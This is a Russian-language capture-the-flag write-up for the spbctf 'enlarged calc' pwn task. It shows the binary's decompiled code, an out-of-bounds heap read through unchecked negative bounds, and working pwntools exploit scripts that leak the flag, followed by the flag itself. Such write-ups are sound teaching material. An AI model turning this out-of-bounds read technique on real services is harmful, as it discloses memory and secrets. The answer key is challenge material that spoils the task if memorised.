[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_enlarged_calc)
Описание:
Enhanced version of Mic Check 4! This calculator supports larger numbers
`nc 109.233.56.90 11718`
**[enlarged.elf](https://pwn.spbctf.ru/files/heap/enlarged_calc/enlarged.elf)**

Main:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int lowBound; // [rsp+0h] [rbp-60h] BYREF
  int highBound; // [rsp+4h] [rbp-5Ch] BYREF
  int num; // [rsp+8h] [rbp-58h] BYREF
  int count; // [rsp+Ch] [rbp-54h]
  int i; // [rsp+10h] [rbp-50h]
  int i_0; // [rsp+14h] [rbp-4Ch]
  int i_1; // [rsp+18h] [rbp-48h]
  int i_2; // [rsp+1Ch] [rbp-44h]
  int *numbers; // [rsp+20h] [rbp-40h]
  unsigned __int64 sum; // [rsp+28h] [rbp-38h]
  unsigned __int64 sum_0; // [rsp+30h] [rbp-30h]
  unsigned __int64 prd; // [rsp+38h] [rbp-28h]
  FILE *f; // [rsp+40h] [rbp-20h]
  char *flag; // [rsp+48h] [rbp-18h]
  char choice[4]; // [rsp+54h] [rbp-Ch] BYREF
  unsigned __int64 v19; // [rsp+58h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);


  count = 0;
  numbers = malloc(0);
  lowBound = 0;
  highBound = 0;
  puts("The ENLARGED Calculator");
  f = fopen("flag.txt", "rb");


  if ( f )
  {
    flag = malloc(0x40u);
    fgets(flag, 64, f);
    fclose(f);
    while ( 1 )
    {
      printf("\nCurrently have %d numbers\n > ", count);
      for ( i = 0; i < count; ++i )
        printf("%d ", numbers[i]);

      putchar(10);
      puts("\nMENU");
      puts("a - add number");
      puts("d - delete last number");


      if ( count > 1 )
      {
        puts("A - average of numbers");
        puts("S - sum of numbers");
        puts("P - product of numbers");
      }
      if ( count > 7 )
        puts("B - set working boundaries");
      printf("choice: ");
      alarm(0x78u);


      if ( __isoc99_scanf("%1s%*c", choice) != 1 )
        break;
      if ( choice[0] == 'a' )
      {
        printf("What number to add: ");
        __isoc99_scanf("%d", &num);
        numbers = realloc(numbers, 4LL * ++count);
        numbers[count - 1] = num;
        highBound = count - 1;
      }
      else if ( choice[0] == 'd' )
      {
        numbers = realloc(numbers, 4LL * --count);
      }
      else if ( choice[0] == 'A' && count > 1 )
      {
        sum = 0;
        for ( i_0 = lowBound; i_0 <= highBound; ++i_0 )
          sum += numbers[i_0];
        printf("Average is: %lld\n", sum / (highBound - lowBound + 1));
      }
      else if ( choice[0] == 'S' && count > 1 )
      {
        sum_0 = 0;
        for ( i_1 = lowBound; i_1 <= highBound; ++i_1 )
          sum_0 += numbers[i_1];
        printf("Sum is: %lld\n", sum_0);
      }
      else if ( choice[0] == 'P' && count > 1 )
      {
        prd = 1;
        for ( i_2 = lowBound; i_2 <= highBound; ++i_2 )
          prd *= numbers[i_2];
        printf("Product is: %lld\n", prd);
      }
      else if ( choice[0] == 'B' && count > 7 )
      {
        printf("Enter new starting position: ");
        __isoc99_scanf("%d", &lowBound);
        printf("Enter new ending position: ");
        __isoc99_scanf("%d", &highBound);
        if ( count <= lowBound || highBound < 0 )
        {
          puts("Bad boundaries!");
          lowBound = 0;
          highBound = count - 1;
        }
        printf("Now will work on numbers #%d - #%d\n", lowBound, highBound);
      }
    }
    return 0;
  }
  else
  {
    puts("Couldn't open flag.txt");
    return 1;
  }
}
```
Чтобы прочитать флаг необходимо добавить 8 чисел, а потом смещать левую и правую границу, чтобы по 1 символу считывать флаг.

После добавления 8 чисел массив чисел оказался по адресу 0x603700, а флаг по адресу 0x6034a0.
![{D3C1808A-A7EB-47B9-9D1C-BF37FA416952}](../../../../z.%20Images/{D3C1808A-A7EB-47B9-9D1C-BF37FA416952}.png)
![{48B10C08-0929-40FC-8F5F-BCF8FDADC7C6}](../../../../z.%20Images/{48B10C08-0929-40FC-8F5F-BCF8FDADC7C6}.png)
Индекс = (0x6034a0 - 0x603700) / 4 (байты - int) = -156.

Эксплоит, который работает на моей локальной libc:
``` python
def add_number(io, num):
    io.sendlineafter(b': ', b'a')
    io.sendlineafter(b': ', str(num).encode())

def set_working_boundaries(io, left, right):
    io.sendlineafter(b':', b'B')
    io.sendlineafter(b':', str(left).encode())
    io.sendlineafter(b':', str(right).encode())

def get_sum(io):
    io.sendlineafter(b':', b'S')
    io.recvuntil(b': ')
    num = int(io.recvline()[:-1].decode())
    return num
    
io = start()

for _ in range(8):
    add_number(io, 0)

nums = []

last = 0
for i in range(-153+64//8, -153, -1):
    set_working_boundaries(io, i, 0)
    num = get_sum(io)
    nums.append(abs(last - num))
    last = num
nums = nums[::-1]

flag = ''
for n in nums:
    if n < 0x10000000 or n > 0xFFFFFFFF:
        continue
    try:
        flag += p32(n).decode()
    except:
        pass

print(flag)

io.interactive()
```

Для сервера необходимо подобрать смещение путём брутфорса.
Исправленный цикл:
``` python
last = 0
for i in range(0, -25, -1):
    set_working_boundaries(io, i, 0)
    num = get_sum(io)
    print(i, abs(last - num))
    last = num
nums = nums[::-1]
```
С -11 по -20 индексы лежат подозрительные числа похожие на флаг:
![{04DC7BDF-60A6-418C-9F59-F55482390204}](../../../../z.%20Images/{04DC7BDF-60A6-418C-9F59-F55482390204}.png)

Финальный код эксплоита:
``` python
def add_number(io, num):
    io.sendlineafter(b': ', b'a')
    io.sendlineafter(b': ', str(num).encode())

def set_working_boundaries(io, left, right):
    io.sendlineafter(b':', b'B')
    io.sendlineafter(b':', str(left).encode())
    io.sendlineafter(b':', str(right).encode())

def get_sum(io):
    io.sendlineafter(b':', b'S')
    io.recvuntil(b': ')
    num = int(io.recvline()[:-1].decode())
    return num
    
io = start()

for _ in range(8):
    add_number(io, 0)

nums = []

last = 0
for i in range(-10, -21, -1):
    set_working_boundaries(io, i, 0)
    num = get_sum(io)
    nums.append(abs(last - num))
    last = num
nums = nums[::-1]

flag = ''
for n in nums:
    if n < 0x10000000 or n > 0xFFFFFFFF:
        continue
    try:
        flag += p32(n).decode()
    except:
        pass

print(flag)

io.interactive()
```

Запуск:
![{176BA4AF-6085-4F10-9AE8-95D7942C33EA}](../../../../z.%20Images/{176BA4AF-6085-4F10-9AE8-95D7942C33EA}.png)

Ответ: `spbctf{97d5388028d1d1afc27d6371e3cffab8}`